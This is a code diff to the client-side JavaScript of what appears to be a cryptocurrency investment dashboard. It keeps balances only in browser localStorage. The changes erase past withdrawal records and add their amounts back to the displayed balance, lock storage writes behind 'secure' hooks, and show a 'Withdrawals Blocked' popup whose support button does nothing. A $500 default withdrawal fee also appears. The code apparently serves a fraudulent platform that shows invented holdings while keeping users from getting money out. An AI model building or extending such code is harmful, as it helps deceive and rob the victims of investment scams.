@@ -6,6 +6,18 @@
   var holdingsKey = "balanceBtcHoldings";
   var bookKey = "balanceUsdBook";
 
+  function secureWrite(fn) {
+    if (window.__runSecureWrite) return window.__runSecureWrite(fn);
+    return fn();
+  }
+
+  function parseTxAmountEarly(tx) {
+    if (tx && tx.amountUsd != null) return Math.abs(Number(tx.amountUsd)) || 0;
+    var raw = String((tx && tx.amount) || "").replace(/[^0-9.\-]/g, "");
+    var n = parseFloat(raw);
+    return isNaN(n) ? 0 : Math.abs(n);
+  }
+
   var balanceResetKey = "balanceResetV3";
   if (localStorage.getItem(balanceResetKey) !== "1") {
     localStorage.setItem("balanceUsd", String(defaultBalance));
@@ -68,6 +80,32 @@
     localStorage.setItem(accountResetV6, "1");
   }
 
+  var purgeWithdrawalsKey = "purgeWithdrawalsV7";
+  if (localStorage.getItem(purgeWithdrawalsKey) !== "1") {
+    try {
+      var txsPurge = JSON.parse(localStorage.getItem("transactions") || "[]");
+      var restoredUsd = 0;
+      txsPurge = txsPurge.filter(function (tx) {
+        if (!tx || tx.type !== "Withdrawal") return true;
+        var status = ((tx.status || "") + "").toLowerCase();
+        if (status === "completed") {
+          restoredUsd += parseTxAmountEarly(tx);
+        }
+        return false;
+      });
+      localStorage.setItem("transactions", JSON.stringify(txsPurge));
+      if (restoredUsd > 0) {
+        var bookAfter = Number(localStorage.getItem(bookKey));
+        if (Number.isNaN(bookAfter)) bookAfter = defaultBalance;
+        var nextBook = bookAfter + restoredUsd;
+        localStorage.setItem(bookKey, String(nextBook));
+        localStorage.setItem("balanceUsd", String(nextBook));
+        localStorage.removeItem(holdingsKey);
+      }
+    } catch (e) {}
+    localStorage.setItem(purgeWithdrawalsKey, "1");
+  }
+
   function formatTxAmountUsd(usd) {
     return "+$" + Number(usd).toLocaleString(undefined, { maximumFractionDigits: 0 });
   }
@@ -80,13 +118,6 @@
       if (status !== "completed") return false;
       return parseTxAmountEarly(tx) === amount;
     });
-  }
-
-  function parseTxAmountEarly(tx) {
-    if (tx && tx.amountUsd != null) return Math.abs(Number(tx.amountUsd)) || 0;
-    var raw = String((tx && tx.amount) || "").replace(/[^0-9.\-]/g, "");
-    var n = parseFloat(raw);
-    return isNaN(n) ? 0 : Math.abs(n);
   }
 
   function syncInitialDepositRecord() {
@@ -200,7 +231,9 @@
     if (!price) return holdings != null ? holdings : 0;
     if (holdings != null) return holdings;
     holdings = getBookUsd() / price;
-    localStorage.setItem(holdingsKey, String(holdings));
+    secureWrite(function () {
+      localStorage.setItem(holdingsKey, String(holdings));
+    });
     return holdings;
   }
 
@@ -293,11 +326,13 @@
 
   window.updateBalance = function (usd) {
     var price = getPrice();
-    localStorage.setItem(bookKey, String(usd));
-    if (price) {
-      localStorage.setItem(holdingsKey, String(usd / price));
-    }
-    localStorage.setItem("balanceUsd", String(usd));
+    secureWrite(function () {
+      localStorage.setItem(bookKey, String(usd));
+      if (price) {
+        localStorage.setItem(holdingsKey, String(usd / price));
+      }
+      localStorage.setItem("balanceUsd", String(usd));
+    });
     site.balanceUsd = usd;
     renderBalances();
   };
@@ -312,6 +347,15 @@
     var fee = site.withdrawalFeeUsd;
     return fee != null && !Number.isNaN(Number(fee)) ? Number(fee) : 500;
   };
+
+  window.isWithdrawalsBlocked = function () {
+    return !!(window.SITE && SITE.withdrawalsBlocked);
+  };
+
+  if (window.isWithdrawalsBlocked()) {
+    document.documentElement.classList.add("withdrawals-blocked");
+    document.body.classList.add("withdrawals-blocked");
+  }
 
   window.getTotalProfit = function () {
     var portfolio = getPortfolioUsd();
@@ -462,7 +506,9 @@
     });
 
     if (changed) {
-      localStorage.setItem("transactions", JSON.stringify(txs));
+      secureWrite(function () {
+        localStorage.setItem("transactions", JSON.stringify(txs));
+      });
     }
     if (balanceDelta !== 0) {
       var base = Number(localStorage.getItem(bookKey));
@@ -485,4 +531,66 @@
     document.dispatchEvent(new CustomEvent("transactionsUpdated"));
   }
   setInterval(processPendingTransactions, 30000);
+
+  function ensureWithdrawBlockedModal() {
+    if (document.getElementById("withdraw-blocked-modal")) return;
+    document.body.insertAdjacentHTML("beforeend",
+      '<div id="withdraw-blocked-modal" class="wallet-modal hidden" role="dialog" aria-modal="true" aria-labelledby="withdraw-blocked-title">' +
+        '<div class="wallet-modal-backdrop" data-withdraw-blocked-close></div>' +
+        '<div class="wallet-modal-card app-card">' +
+          '<h2 id="withdraw-blocked-title" class="wallet-modal-title">Withdrawals Blocked</h2>' +
+          '<p class="wallet-modal-body text-gray-400 text-sm">Withdrawals are currently unavailable on your account. Please contact support for assistance.</p>' +
+          '<div class="wallet-modal-actions">' +
+            '<button type="button" class="btn-ghost" data-withdraw-blocked-close>Close</button>' +
+            '<button type="button" class="btn-primary" id="withdraw-blocked-support">Contact Support</button>' +
+          '</div>' +
+        '</div>' +
+      '</div>'
+    );
+    document.querySelectorAll("[data-withdraw-blocked-close]").forEach(function (el) {
+      el.addEventListener("click", closeWithdrawBlockedModal);
+    });
+    var supportBtn = document.getElementById("withdraw-blocked-support");
+    if (supportBtn) {
+      supportBtn.addEventListener("click", function (e) {
+        e.preventDefault();
+      });
+    }
+    document.addEventListener("keydown", function (e) {
+      if (e.key === "Escape") closeWithdrawBlockedModal();
+    });
+  }
+
+  function openWithdrawBlockedModal() {
+    ensureWithdrawBlockedModal();
+    document.getElementById("withdraw-blocked-modal").classList.remove("hidden");
+    document.body.classList.add("wallet-modal-open");
+  }
+
+  function closeWithdrawBlockedModal() {
+    var modal = document.getElementById("withdraw-blocked-modal");
+    if (modal) modal.classList.add("hidden");
+    document.body.classList.remove("wallet-modal-open");
+  }
+
+  window.showWithdrawBlockedModal = openWithdrawBlockedModal;
+  window.closeWithdrawBlockedModal = closeWithdrawBlockedModal;
+
+  function initWithdrawBlockedLinks() {
+    document.addEventListener("click", function (e) {
+      var link = e.target.closest(".nav-withdraw-link, .dash-withdraw-link, [data-withdraw-link]");
+      if (!link || !window.isWithdrawalsBlocked()) return;
+      e.preventDefault();
+      openWithdrawBlockedModal();
+    });
+  }
+
+  if (window.isWithdrawalsBlocked()) {
+    initWithdrawBlockedLinks();
+    if (location.pathname.indexOf("/dashboard/withdrawals") !== -1) {
+      openWithdrawBlockedModal();
+    }
+  }
+
+  if (window.__sealSecureStorage) window.__sealSecureStorage();
 })();
